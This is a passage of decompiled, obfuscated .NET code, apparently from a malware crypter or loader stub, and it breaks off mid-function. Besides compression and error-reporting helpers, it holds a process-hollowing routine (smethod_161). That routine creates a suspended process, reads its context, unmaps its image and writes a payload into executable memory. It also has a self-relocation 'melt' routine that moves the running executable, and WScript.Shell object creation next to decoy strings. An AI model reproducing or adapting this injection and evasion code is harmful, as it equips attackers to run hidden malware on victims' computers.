					if (v2IJBhvCyRSyXwG8iyi())
					{
						goto IL_01bb;
					}
					goto IL_02b9;
				case 3:
					if (class36_0.int_8 < class36_0.int_5)
					{
						num = Class58.smethod_10(class33_0, 3);
						if (num >= 0)
						{
							Class58.smethod_28(class33_0, 3);
							goto IL_004d;
						}
						result = false;
						num2 = 8;
						if (!v2IJBhvCyRSyXwG8iyi())
						{
							goto IL_0097;
						}
						goto IL_01bb;
					}
					class36_0.class35_0 = new Class31.Class35(class36_0.byte_0);
					class36_0.byte_0 = null;
					goto IL_0139;
				case 2:
					goto IL_00df;
				case 4:
				{
					int num4;
					while (((num4 = Class58.smethod_111(class36_0.class35_0, class33_0)) & -16) == 0)
					{
						class36_0.byte_1[class36_0.int_8++] = (class36_0.byte_2 = (byte)num4);
						if (class36_0.int_8 != class36_0.int_6)
						{
							continue;
						}
						goto IL_0333;
					}
					if (num4 >= 0)
					{
						if (num4 >= 17)
						{
							class36_0.byte_2 = 0;
						}
						class36_0.int_7 = num4 - 16;
						class36_0.int_2 = 5;
						goto case 5;
					}
					result = false;
					goto IL_033a;
				}
				case 1:
					class36_0.int_4 = Class58.smethod_10(class33_0, 5);
					if (class36_0.int_4 >= 0)
					{
						class36_0.int_4++;
						Class58.smethod_28(class33_0, 5);
						num2 = 2;
						if (IwxRFxvB9dB3g1fRikX())
						{
						}
						goto IL_01bb;
					}
					result = false;
					goto IL_033a;
				case 0:
					{
						class36_0.int_3 = Class58.smethod_10(class33_0, 5);
						if (class36_0.int_3 >= 0)
						{
							class36_0.int_3 += 257;
							Class58.smethod_28(class33_0, 5);
							class36_0.int_2 = 1;
							goto case 1;
						}
						result = false;
						goto IL_033a;
					}
					IL_004d:
					class36_0.byte_0[Class31.Class36.int_9[class36_0.int_8]] = (byte)num;
					class36_0.int_8++;
					goto case 3;
					IL_0097:
					class36_0.byte_0 = new byte[19];
					class36_0.int_8 = 0;
					goto IL_00ab;
					IL_0139:
					class36_0.int_8 = 0;
					class36_0.int_2 = 4;
					goto case 4;
					IL_01bb:
					switch (num2)
					{
					case 5:
						break;
					case 13:
						goto IL_004d;
					case 14:
						goto IL_0097;
					case 15:
						goto IL_00ab;
					case 2:
						class36_0.int_6 = class36_0.int_3 + class36_0.int_4;
						class36_0.byte_1 = new byte[class36_0.int_6];
						class36_0.int_2 = 2;
						goto IL_00df;
					case 1:
						goto IL_00df;
					default:
						goto IL_0139;
					case 0:
					case 9:
						continue;
					case 10:
						if (num3 >= 0)
						{
							Class58.smethod_28(class33_0, int_2);
							goto IL_02b9;
						}
						goto case 12;
					case 6:
					case 11:
						goto IL_02b9;
					case 7:
						goto IL_02ec;
					case 3:
						goto IL_0324;
					case 12:
						result = false;
						goto IL_033a;
					case 8:
					case 16:
						goto IL_033a;
					}
					goto case 5;
					IL_02b9:
					num3 += Class31.Class36.int_0[class36_0.int_7];
					goto IL_02ec;
					IL_02ec:
					while (num3-- > 0)
					{
						class36_0.byte_1[class36_0.int_8++] = class36_0.byte_2;
					}
					if (class36_0.int_8 == class36_0.int_6)
					{
						goto IL_0324;
					}
					class36_0.int_2 = 4;
					break;
					IL_0324:
					result = true;
					goto IL_033a;
					IL_033a:
					return result;
					IL_00df:
					class36_0.int_5 = Class58.smethod_10(class33_0, 4);
					if (class36_0.int_5 >= 0)
					{
						class36_0.int_5 += 4;
						Class58.smethod_28(class33_0, 4);
						num2 = 14;
						if (v2IJBhvCyRSyXwG8iyi())
						{
							goto IL_01bb;
						}
					}
					else
					{
						result = false;
					}
					goto IL_033a;
					IL_0333:
					result = true;
					goto IL_033a;
					IL_00ab:
					class36_0.int_2 = 3;
					goto case 3;
				}
				break;
			}
		}
	}

	[DllImport("user32", CharSet = CharSet.Unicode)]
	internal static extern int DrawText(IntPtr intptr_0, string string_0, int int_0, ref Class57.Struct23 struct23_0, int int_1);

	static void smethod_127(Class31.Class33 class33_0)
	{
		class33_0.uint_0 >>= class33_0.int_2 & 7;
		class33_0.int_2 &= -8;
	}

	static void smethod_128(string string_0, Class45 class45_0, string string_1)
	{
		if (File.Exists(string_0))
		{
			Class45.Struct20 value = new Class45.Struct20(string_0);
			class45_0.dictionary_1.Add(string_1, value);
		}
	}

	static byte[] smethod_129(Class45 class45_0)
	{
		return class45_0.method_4();
	}

	static object smethod_130(Class49 class49_0)
	{
		return class49_0.object_0;
	}

	static void smethod_131()
	{
		Process process = new Process();
		process.WaitForExit();
		int num = 4;
		if (!IwxRFxvB9dB3g1fRikX())
		{
			while (true)
			{
				switch (num)
				{
				default:
					num = 2;
					if (v2IJBhvCyRSyXwG8iyi())
					{
						continue;
					}
					goto case 0;
				case 0:
				case 4:
					if (!process.HasExited)
					{
						break;
					}
					goto IL_0055;
				case 1:
				case 3:
					break;
				case 2:
					goto IL_005b;
				case 5:
					goto IL_0085;
				}
				break;
			}
		}
		process.Kill();
		goto IL_0055;
		IL_0055:
		string text = "3232dsd";
		goto IL_005b;
		IL_0085:
		string text2 = "3232dsd";
		return;
		IL_005b:
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WSfcfdfdsfdsfsffffffffffffffccript.Shell", ""));
		objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
		goto IL_0085;
	}

	static void smethod_132(EventArgs1 eventArgs1_0, bool bool_0)
	{
		eventArgs1_0.bool_2 = bool_0;
	}

	static void smethod_133(Class31.Stream0 stream0_0, int int_0)
	{
		Class58.smethod_91(stream0_0, int_0);
		Class58.smethod_91(stream0_0, int_0 >> 16);
	}

	static void smethod_134(bool bool_0, Control3 control3_0)
	{
		control3_0.timer_0.set_Enabled(bool_0);
		control3_0.int_0 = 0;
		((Control)control3_0).Refresh();
	}

	static Class31.Class35 smethod_135(Class31.Class36 class36_0)
	{
		byte[] array = new byte[class36_0.int_3];
		Array.Copy(class36_0.byte_1, 0, array, 0, class36_0.int_3);
		return new Class31.Class35(array);
	}

	static void smethod_136(bool bool_0, Class31.Class38 class38_0, byte[] byte_0, int int_0, int int_1)
	{
		class38_0.class39_0.short_0[256]++;
		Class31.Class38.Class39 class39_3 = default(Class31.Class38.Class39);
		short[] short_ = default(short[]);
		byte[] byte_ = default(byte[]);
		while (true)
		{
			Class58.smethod_93(class38_0.class39_0);
			Class58.smethod_93(class38_0.class39_1);
			Class31.Class38.Class39 class39_ = class38_0.class39_0;
			Class31.Class38.Class39 class39_2 = class38_0.class39_2;
			Class58.smethod_9(class39_2, class39_);
			class39_ = class38_0.class39_1;
			class39_2 = class38_0.class39_2;
			Class58.smethod_9(class39_2, class39_);
			while (true)
			{
				Class58.smethod_93(class38_0.class39_2);
				int num = 4;
				while (true)
				{
					for (int num2 = 18; num2 > num; num2--)
					{
						if (class38_0.class39_2.byte_0[Class31.Class38.int_0[num2]] > 0)
						{
							num = num2 + 1;
						}
					}
					int num3 = 14 + num * 3 + Class58.smethod_101(class38_0.class39_2) + Class58.smethod_101(class38_0.class39_0) + Class58.smethod_101(class38_0.class39_1) + class38_0.int_2;
					while (true)
					{
						IL_013f:
						int num4 = class38_0.int_2;
						while (true)
						{
							for (int i = 0; i < 286; i++)
							{
								num4 += class38_0.class39_0.short_0[i] * Class31.Class38.byte_2[i];
							}
							for (int j = 0; j < 30; j++)
							{
								num4 += class38_0.class39_1.short_0[j] * Class31.Class38.byte_3[j];
							}
							if (num3 >= num4)
							{
								if (IwxRFxvB9dB3g1fRikX())
								{
									break;
								}
								switch (2)
								{
								default:
									return;
								case 6:
									break;
								case 5:
									goto IL_013f;
								case 12:
									goto end_IL_0138;
								case 1:
									goto end_IL_014a;
								case 4:
									goto end_IL_0153;
								case 2:
									goto IL_01ad;
								case 13:
									return;
								case 0:
								case 7:
									goto IL_0205;
								case 3:
									goto IL_020c;
								case 9:
								case 10:
									goto IL_0218;
								case 8:
									goto IL_0220;
								case 11:
									goto IL_0226;
								case 14:
									goto IL_0251;
								}
								continue;
							}
							goto IL_01b1;
							IL_0205:
							class39_3 = class38_0.class39_1;
							goto IL_020c;
							IL_020c:
							short_ = Class31.Class38.short_2;
							byte_ = Class31.Class38.byte_3;
							goto IL_0218;
							IL_0226:
							Class58.smethod_36(class38_0);
							return;
							IL_0218:
							Class58.smethod_116(byte_, class39_3, short_);
							goto IL_0220;
							IL_0220:
							Class58.smethod_88(class38_0);
							goto IL_0226;
							IL_0251:
							Class58.smethod_36(class38_0);
							return;
							IL_01ad:
							num3 = num4;
							goto IL_01b1;
							IL_01b1:
							if (int_1 >= 0 && int_0 + 4 < num3 >> 3)
							{
								Class58.smethod_151(byte_0, bool_0, int_1, class38_0, int_0);
								return;
							}
							if (num3 == num4)
							{
								Class58.smethod_83(class38_0.class41_0, 2 + (bool_0 ? 1 : 0), 3);
								class39_3 = class38_0.class39_0;
								short_ = Class31.Class38.short_1;
								byte_ = Class31.Class38.byte_2;
								Class58.smethod_116(byte_, class39_3, short_);
								goto IL_0205;
							}
							Class58.smethod_83(class38_0.class41_0, 4 + (bool_0 ? 1 : 0), 3);
							Class58.smethod_125(num, class38_0);
							Class58.smethod_88(class38_0);
							goto IL_0251;
							continue;
							end_IL_0138:
							break;
						}
						break;
					}
					continue;
					end_IL_014a:
					break;
				}
				continue;
				end_IL_0153:
				break;
			}
		}
	}

	static Icon smethod_137()
	{
		try
		{
			return Class58.smethod_110();
		}
		catch (Exception)
		{
			return Class58.smethod_142("default");
		}
	}

	static bool smethod_138()
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Class58.smethod_72((Class54)new Class55());
			return true;
		}
		catch (SecurityException)
		{
			try
			{
				Application.EnableVisualStyles();
				string securityMessage = string.Format("{0} cannot initialize itself because some permissions are not granted.\n\nYou probably try to launch {0} in a partial-trust situation. It's usually the case when the application is hosted on a network share.\n\nYou need to run {0} in full-trust, or at least grant it the UnmanagedCode security permission.\n\nTo grant this application the required permission, contact your system administrator, or use the Microsoft .NET Framework Configuration tool.", "vf");
				Form1 form = new Form1(new EventArgs2(securityMessage, canContinue: false));
				((Form)form).set_ShowInTaskbar(true);
				((Form)form).ShowDialog();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.ToString(), string.Format("{0} Fatal Error", "vf"), (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			return false;
		}
	}

	static bool smethod_139(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_0.GetName().GetPublicKey();
		int num = 2;
		byte[] publicKey2 = default(byte[]);
		int num2 = default(int);
		if (v2IJBhvCyRSyXwG8iyi())
		{
			bool result = default(bool);
			while (true)
			{
				switch (num)
				{
				case 0:
				case 2:
					break;
				case 4:
					goto end_IL_0044;
				default:
					goto IL_0084;
				case 6:
					goto IL_0088;
				case 1:
				case 3:
					return result;
				}
				publicKey2 = assembly_1.GetName().GetPublicKey();
				if (publicKey2 == null == (publicKey == null))
				{
					if (publicKey2 != null)
					{
						num2 = 0;
						num = 4;
						if (v2IJBhvCyRSyXwG8iyi())
						{
							continue;
						}
					}
					goto IL_0088;
				}
				return false;
				continue;
				end_IL_0044:
				break;
			}
		}
		while (num2 < publicKey2.Length)
		{
			if (publicKey2[num2] != publicKey[num2])
			{
				goto IL_0084;
			}
			num2++;
		}
		goto IL_0088;
		IL_0084:
		return false;
		IL_0088:
		return true;
	}

	static void smethod_140()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		object executablePath = default(object);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 301:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_0056;
						case 5:
							goto IL_005f;
						case 6:
							goto IL_0064;
						case 7:
							goto IL_008f;
						case 8:
						case 9:
							goto IL_0094;
						case 12:
							goto IL_00a0;
						case 13:
							goto IL_00a4;
						case 14:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 10:
						case 11:
						case 15:
						case 16:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00a4:
					num = 13;
					File.Delete(text + "melt.txt");
					break;
					IL_0008:
					num = 2;
					text2 = Interaction.Environ(Class58.smethod_109("5g+BxFHXkdTcEM3cEGgk0A==")) + Class58.smethod_109("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_002a;
					IL_002a:
					num = 3;
					text = "" + Interaction.Environ(Class58.smethod_109("5g+BxFHXkdTcEM3cEGgk0A==")) + Class58.smethod_109("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + "";
					goto IL_0056;
					IL_0056:
					num = 4;
					executablePath = Application.get_ExecutablePath();
					goto IL_005f;
					IL_005f:
					num = 5;
					flag = false;
					goto IL_0064;
					IL_0064:
					num = 6;
					if (Operators.ConditionalCompareObjectEqual(executablePath, (object)(text + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\" + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==")), false))
					{
						goto IL_008f;
					}
					goto IL_0094;
					IL_008f:
					num = 7;
					flag = true;
					goto IL_0094;
					IL_0094:
					num = 9;
					if (flag)
					{
						goto end_IL_0000_3;
					}
					goto IL_00a0;
					IL_00a0:
					num = 12;
					goto IL_00a4;
					end_IL_0000_2:
					break;
				}
				num = 14;
				File.Move(Application.get_ExecutablePath(), text + "melt.txt");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 301;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static string smethod_141(string string_0)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\RedGate\\SmartAssembly");
			if (registryKey == null)
			{
				return string.Empty;
			}
			string result = (string)registryKey.GetValue(string_0, string.Empty);
			registryKey.Close();
			return result;
		}
		catch
		{
			return string.Empty;
		}
	}

	static Icon smethod_142(string string_0)
	{
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + string_0 + ".ico");
			if (!IwxRFxvB9dB3g1fRikX())
			{
				switch (2)
				{
				case 0:
				case 2:
					break;
				default:
					goto IL_0047;
				}
			}
			if (manifestResourceStream != null)
			{
				goto IL_0047;
			}
			object result = null;
			goto IL_004d;
			IL_0047:
			result = (object)new Icon(manifestResourceStream);
			goto IL_004d;
			IL_004d:
			return (Icon)result;
		}
		catch
		{
			return null;
		}
	}

	static int smethod_143(Class31.Class34 class34_0)
	{
		return 32768 - class34_0.int_1;
	}

	static void smethod_144(Exception exception_0, object[] object_0)
	{
		try
		{
			if ((object)exception_0.GetType() == typeof(Exception) && exception_0.Message == "{report}")
			{
				exception_0 = exception_0.InnerException;
			}
			else
			{
				Class58.smethod_19(exception_0, object_0);
			}
			Class54.Handler.method_3(exception_0, bool_1: true, bool_2: true);
		}
		catch
		{
		}
	}

	static Class31.Class35 smethod_145(Class31.Class36 class36_0)
	{
		byte[] array = new byte[class36_0.int_4];
		Array.Copy(class36_0.byte_1, class36_0.int_3, array, 0, class36_0.int_4);
		return new Class31.Class35(array);
	}

	static int smethod_146(Font font_0, string string_0, Graphics graphics_0, int int_0)
	{
		try
		{
			return Class58.smethod_158(font_0, string_0, int_0, graphics_0);
		}
		catch (Exception)
		{
			try
			{
				return Convert.ToInt32((double)Class58.smethod_74(int_0, font_0, graphics_0, string_0) * 1.1);
			}
			catch (Exception)
			{
			}
		}
		return 0;
	}

	static byte[] smethod_147(string string_0, byte[] byte_0)
	{
		checked
		{
			byte[] array = new byte[byte_0.Length + 1];
			int num = byte_0[byte_0.Length - 1] ^ 0x70;
			byte[] bytes = Encoding.Default.GetBytes(string_0);
			int num2 = byte_0.Length - 1;
			int num3 = default(int);
			for (int i = 0; i <= num2; i++)
			{
				array[i] = (byte)(byte_0[i] ^ num ^ bytes[num3]);
				num3 = ((num3 != string_0.Length - 1) ? (num3 + 1) : 0);
			}
			return (byte[])Utils.CopyArray((Array)array, (Array)new byte[byte_0.Length - 2 + 1]);
		}
	}

	static void smethod_148(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_1 = false;
	}

	static void smethod_149(int int_0, int int_1, Class31.Class41 class41_0, byte[] byte_0)
	{
		Array.Copy(byte_0, int_0, class41_0.byte_0, class41_0.int_1, int_1);
		class41_0.int_1 += int_1;
	}

	static void smethod_150(Class31.Class41 class41_0, int int_0)
	{
		class41_0.byte_0[class41_0.int_1++] = (byte)int_0;
		class41_0.byte_0[class41_0.int_1++] = (byte)(int_0 >> 8);
	}

	static void smethod_151(byte[] byte_0, bool bool_0, int int_0, Class31.Class38 class38_0, int int_1)
	{
		Class58.smethod_83(class38_0.class41_0, bool_0 ? 1 : 0, 3);
		Class58.smethod_2(class38_0.class41_0);
		Class58.smethod_150(class38_0.class41_0, int_1);
		Class58.smethod_150(class38_0.class41_0, ~int_1);
		Class58.smethod_149(int_0, int_1, class38_0.class41_0, byte_0);
		Class58.smethod_36(class38_0);
	}

	static bool smethod_152(Class45 class45_0, string string_0)
	{
		try
		{
			byte[] byte_ = class45_0.method_4();
			byte[] byte_2;
			try
			{
				byte_2 = Class58.smethod_56(byte_);
			}
			catch
			{
				byte_2 = null;
			}
			byte[] array = Class58.smethod_156(byte_2, "<RSAKeyValue><Modulus>lXAo73/15RcoubOjnZaBc/9y4v9tehHA7qz4Ab3/vH43Kr2dy+hQ9zOEqpmefPmTh0Z+hj4AYJVZLJ5rlo74JB9SJJDN3B3t+p6SWnJtylAEpeaNQXzbaUuJnWtC8C2sf38RnSlOOzwgF/3U2oZHrNsZUPKouGIovSSnrG7bSak=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
			FileStream fileStream = File.OpenWrite(string_0);
			byte[] bytes = Encoding.ASCII.GetBytes("{FE10A302-31B7-4EF2-AA46-5131772A0A9D}");
			fileStream.Write(bytes, 0, bytes.Length);
			fileStream.Write(array, 0, array.Length);
			fileStream.Close();
			return true;
		}
		catch (ThreadAbortException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static void smethod_153(Exception exception_0)
	{
		if (exception_0 == null || !(exception_0 is SecurityException) || !(Class54.string_0 == "1") || !Class54.Handler.method_2((SecurityException)exception_0))
		{
			Class54.Handler.method_3(exception_0, bool_1: false, bool_2: false);
		}
	}

	static string smethod_154(object object_0)
	{
		try
		{
			if (object_0 == null)
			{
				return string.Empty;
			}
			if (object_0 is int)
			{
				goto IL_00dd;
			}
			if (object_0 is long num)
			{
				return num.ToString("x");
			}
			if (object_0 is short num2)
			{
				return num2.ToString("x");
			}
			if (object_0 is uint num3)
			{
				return num3.ToString("x");
			}
			if (object_0 is ulong)
			{
				goto IL_00f7;
			}
			if (object_0 is ushort)
			{
				string result = default(string);
				while (true)
				{
					ushort num4 = (ushort)object_0;
					if (IwxRFxvB9dB3g1fRikX())
					{
					}
					switch (4)
					{
					case 7:
						break;
					case 0:
						goto end_IL_0092;
					case 3:
						goto IL_00f7;
					case 4:
						return num4.ToString("x");
					default:
						goto IL_0138;
					case 1:
						goto IL_016e;
					case 9:
						goto IL_0175;
					case 6:
					case 8:
						goto IL_019c;
					case 10:
						return result;
					case 11:
						return result;
					}
					continue;
					end_IL_0092:
					break;
				}
				goto IL_00dd;
			}
			byte b = default(byte);
			if (object_0 is byte)
			{
				b = (byte)object_0;
				goto IL_0138;
			}
			if (object_0 is sbyte b2)
			{
				return b2.ToString("x");
			}
			if (object_0 is IntPtr)
			{
				goto IL_016e;
			}
			UIntPtr uIntPtr = default(UIntPtr);
			if (object_0 is UIntPtr)
			{
				uIntPtr = (UIntPtr)object_0;
				goto IL_019c;
			}
			goto end_IL_0000;
			IL_00f7:
			return ((ulong)object_0).ToString("x");
			IL_0175:
			IntPtr intPtr = default(IntPtr);
			return intPtr.ToInt64().ToString("x");
			IL_019c:
			return uIntPtr.ToUInt64().ToString("x");
			IL_016e:
			intPtr = (IntPtr)object_0;
			goto IL_0175;
			IL_0138:
			return b.ToString("x");
			IL_00dd:
			return ((int)object_0).ToString("x");
			end_IL_0000:;
		}
		catch
		{
		}
		return string.Empty;
	}

	static void smethod_155(Control0 control0_0)
	{
		if (!IwxRFxvB9dB3g1fRikX())
		{
			switch (0)
			{
			case 0:
				control0_0.timer_0.set_Enabled(true);
				break;
			case 1:
			case 4:
				break;
			default:
				goto IL_004a;
			case 5:
				return;
			}
		}
		control0_0.image_0 = (Image)(object)Class58.smethod_55("current");
		goto IL_004a;
		IL_004a:
		control0_0.bool_0 = true;
		((Control)control0_0).Refresh();
	}

	static byte[] smethod_156(byte[] byte_0, string string_0)
	{
		RijndaelManaged rijndaelManaged = default(RijndaelManaged);
		RSACryptoServiceProvider rSACryptoServiceProvider = default(RSACryptoServiceProvider);
		MemoryStream memoryStream = default(MemoryStream);
		CryptoStream cryptoStream = default(CryptoStream);
		while (true)
		{
			if (string_0.StartsWith("{"))
			{
				if (!IwxRFxvB9dB3g1fRikX())
				{
					switch (4)
					{
					case 0:
					case 3:
						break;
					case 1:
					case 4:
						Class43.string_0 = "ERR 2006: This template was not properly processed by SmartAssembly";
						goto IL_004e;
					case 5:
						goto IL_004e;
					default:
						goto IL_0056;
					case 6:
						goto end_IL_0032;
					}
					continue;
				}
				goto IL_004e;
			}
			rijndaelManaged = null;
			rSACryptoServiceProvider = null;
			memoryStream = null;
			goto IL_0056;
			IL_004e:
			return null;
			IL_0056:
			cryptoStream = null;
			break;
			continue;
			end_IL_0032:
			break;
		}
		try
		{
			rijndaelManaged = new RijndaelManaged();
			rSACryptoServiceProvider = new RSACryptoServiceProvider();
			rSACryptoServiceProvider.FromXmlString(string_0);
			rijndaelManaged.GenerateKey();
			rijndaelManaged.GenerateIV();
			byte[] array = new byte[48];
			Buffer.BlockCopy(rijndaelManaged.Key, 0, array, 0, 32);
			Buffer.BlockCopy(rijndaelManaged.IV, 0, array, 32, 16);
			memoryStream = new MemoryStream();
			try
			{
				byte[] array2 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
				memoryStream.WriteByte(1);
				memoryStream.WriteByte(Convert.ToByte(array2.Length / 8));
				memoryStream.Write(array2, 0, array2.Length);
			}
			catch (CryptographicException)
			{
				try
				{
					byte[] array3 = new byte[16];
					while (true)
					{
						byte[] array4 = new byte[16];
						Buffer.BlockCopy(rijndaelManaged.Key, 0, array3, 0, 16);
						Buffer.BlockCopy(rijndaelManaged.Key, 16, array4, 0, 16);
						byte[] array5 = rSACryptoServiceProvider.Encrypt(array3, fOAEP: false);
						while (true)
						{
							byte[] array6 = rSACryptoServiceProvider.Encrypt(array4, fOAEP: false);
							byte[] array7 = rSACryptoServiceProvider.Encrypt(rijndaelManaged.IV, fOAEP: false);
							while (true)
							{
								memoryStream.WriteByte(2);
								memoryStream.WriteByte(Convert.ToByte(array5.Length / 8));
								while (true)
								{
									memoryStream.Write(array5, 0, array5.Length);
									memoryStream.Write(array6, 0, array6.Length);
									if (IwxRFxvB9dB3g1fRikX())
									{
									}
									switch (6)
									{
									case 5:
										break;
									default:
										goto end_IL_00ea;
									case 3:
										goto end_IL_0131;
									case 0:
									case 1:
										goto end_IL_014b;
									case 6:
										memoryStream.Write(array7, 0, array7.Length);
										goto end_IL_0167;
									}
									continue;
									end_IL_00ea:
									break;
								}
								continue;
								end_IL_0131:
								break;
							}
							continue;
							end_IL_014b:
							break;
						}
						continue;
						end_IL_0167:
						break;
					}
				}
				catch (CryptographicException)
				{
					Class43.string_0 = "ERR 2005: The 128-bit encryption is not available on this computer. You need to install the High Encryption Pack in order to use the reporting feature.";
					return null;
				}
			}
			cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.FlushFinalBlock();
			return memoryStream.ToArray();
		}
		catch (Exception ex3)
		{
			Class43.string_0 = "ERR 2004: " + ex3.Message;
			return null;
		}
		finally
		{
			rijndaelManaged?.Clear();
			rSACryptoServiceProvider?.Clear();
			memoryStream?.Close();
			cryptoStream?.Close();
		}
	}

	static byte[] smethod_157(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		return Class58.smethod_27(byte_0, 3, byte_2, byte_1);
	}

	static int smethod_158(Font font_0, string string_0, int int_0, Graphics graphics_0)
	{
		Class57.Struct23 struct23_ = new Class57.Struct23(new Rectangle(0, 0, int_0, 10000));
		IntPtr hdc = graphics_0.GetHdc();
		IntPtr intptr_ = font_0.ToHfont();
		IntPtr intptr_2 = SelectObject(hdc, intptr_);
		DrawText(hdc, string_0, -1, ref struct23_, 3088);
		SelectObject(hdc, intptr_2);
		graphics_0.ReleaseHdc(hdc);
		return struct23_.int_3 - struct23_.int_1;
	}

	static void smethod_159(Class44 class44_0, Enum4 enum4_0, string string_0)
	{
		Class58.smethod_23(class44_0, enum4_0, string_0, string.Empty);
	}

	static void smethod_160(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(false);
		control0_0.image_0 = null;
		control0_0.bool_0 = false;
		control0_0.string_0 = string.Empty;
		((Control)control0_0).Refresh();
		((Control)control0_0).set_Height(16);
	}

	static bool smethod_161(object[] object_0)
	{
		Class17.Class18 @class = new Class17.Class18();
		Class20.Delegate3 @delegate = Class17.smethod_1<Class20.Delegate3>(Class58.smethod_94("Sk1N1W/kLlYPS5rz2GRFew=="), Class58.smethod_94("ABUKocXA/8U8/dTyQqSgxw=="));
		Class20.Delegate4 delegate2 = Class17.smethod_1<Class20.Delegate4>(Class58.smethod_94("Sk1N1W/kLlYPS5rz2GRFew=="), Class58.smethod_94("0r4Q+KffRShOMrJXQ5bIPBPfs2ueDUQLhElRpvSNOD8="));
		Class20.Delegate5 delegate3 = Class17.smethod_1<Class20.Delegate5>(Class58.smethod_94("Sk1N1W/kLlYPS5rz2GRFew=="), Class58.smethod_94("Fk2eZIMApwcIWTEmb2cS+hpgxP8KTAVFVbM4GPTL2b4="));
		Class20.Delegate6 delegate4 = Class17.smethod_1<Class20.Delegate6>(Class58.smethod_94("Sk1N1W/kLlYPS5rz2GRFew=="), Class58.smethod_94("sBgrGtKz4j+pZ39VniTPP4yPMBN4WHVY4IS8ZY4fmSE="));
		Class20.Delegate7 delegate5 = Class17.smethod_1<Class20.Delegate7>(Class58.smethod_94("pdd3zZ5lwXtj8hV1GKRfVw=="), Class58.smethod_94("2duPdAetIoKQy5xe5y0s2W+3unGrWO/nhF7+U9Kw7MI="));
		Class20.Delegate8 delegate6 = Class17.smethod_1<Class20.Delegate8>(Class58.smethod_94("pdd3zZ5lwXtj8hV1GKRfVw=="), Class58.smethod_94("RxKVVbtH14pgjdXaw2C1YbWUQxywTFbqf/pZBB51J5c="));
		Class20.Delegate9 delegate7 = Class17.smethod_1<Class20.Delegate9>(Class58.smethod_94("Sk1N1W/kLlYPS5rz2GRFew=="), Class58.smethod_94("TgOhAyN9YiqdYirD3QytuA=="));
		Class20.Delegate10 delegate8 = Class17.smethod_1<Class20.Delegate10>(Class58.smethod_94("pdd3zZ5lwXtj8hV1GKRfVw=="), Class58.smethod_94("qt4tHmTORXFlu08c+szp/A=="));
		string text = (string)object_0[0];
		byte[] array = (byte[])object_0[1];
		bool flag = (bool)object_0[2];
		bool flag2 = (bool)object_0[3];
		string text2 = (string)object_0[4];
		int bytesRead = 0;
		string text3 = $"\"{text2}\"";
		Class20.Struct1 startupInfo = default(Class20.Struct1);
		@class.struct0_0 = default(Class20.Struct0);
		startupInfo.uint_0 = Convert.ToUInt32(Marshal.SizeOf(typeof(Class20.Struct1)));
		bool result;
		checked
		{
			try
			{
				Class17.Class18.Class19 CS_0024_003C_003E8__locals0 = new Class17.Class18.Class19();
				CS_0024_003C_003E8__locals0.class18_0 = @class;
				int num7 = default(int);
				Thread thread = default(Thread);
				int num9 = default(int);
				int srcOffset = default(int);
				while (true)
				{
					if (!string.IsNullOrEmpty(text))
					{
						text3 = text3 + " " + text;
					}
					if (@delegate(text2, text3, IntPtr.Zero, IntPtr.Zero, inheritHandles: false, 4u, IntPtr.Zero, null, ref startupInfo, ref @class.struct0_0))
					{
						int num = BitConverter.ToInt32(array, 60);
						int num2 = BitConverter.ToInt32(array, num + 52);
						int[] array2 = new int[179];
						array2[0] = 65538;
						if (delegate4(@class.struct0_0.intptr_1, array2))
						{
							int num3 = array2[41];
							int buffer = 0;
							if (delegate2(@class.struct0_0.intptr_0, num3 + 8, ref buffer, 4, ref bytesRead))
							{
								if (num2 != buffer || delegate6(@class.struct0_0.intptr_0, buffer) == 0)
								{
									int length = BitConverter.ToInt32(array, num + 80);
									while (true)
									{
										IL_0428:
										CS_0024_003C_003E8__locals0.int_1 = BitConverter.ToInt32(array, num + 84);
										while (true)
										{
											IL_03f8:
											bool flag3 = false;
											CS_0024_003C_003E8__locals0.int_0 = delegate7(@class.struct0_0.intptr_0, num2, length, 12288, 64);
											if (!flag && CS_0024_003C_003E8__locals0.int_0 == 0)
											{
												flag3 = true;
